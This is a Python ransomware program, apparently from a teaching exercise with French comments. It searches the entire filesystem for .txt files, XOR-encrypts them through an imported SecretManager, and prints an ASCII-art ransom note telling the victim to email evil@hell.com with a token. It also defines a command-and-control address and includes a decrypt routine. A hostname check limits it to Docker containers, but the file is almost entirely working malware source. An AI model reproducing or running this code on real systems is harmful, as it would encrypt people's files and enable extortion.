import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        files = []
        for file in Path("/").rglob(filter):
            files.append(str(file.resolve()))
        return files

    def encrypt(self):
        secret_manager = SecretManager()
        files = self.get_files("*.txt")
        secret_manager.setup() #génération et stockage des clés
        secret_manager.xorfiles(files) #chiffrement
        print(ENCRYPT_MESSAGE.format(token=secret_manager.get_hex_token()))

    def decrypt(self):
        secret_manager = SecretManager()
        secret_manager.load()
        
        while True:
            key=input("entrer la clé pour déchiffrer: ")
            try:
                secret_manager.set_key(key) #verification de la clé
                files= self.get_files("*.txt")
                secret_manager.xorfiles(files) #déchiffrement de fichiers txt
                secret_manager.clean() #suppression des traces
                print("Fichiers restaurés avec succes")
                break
            except Exception:
                print("Clé incorrecte, veuillez réessayer")

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()

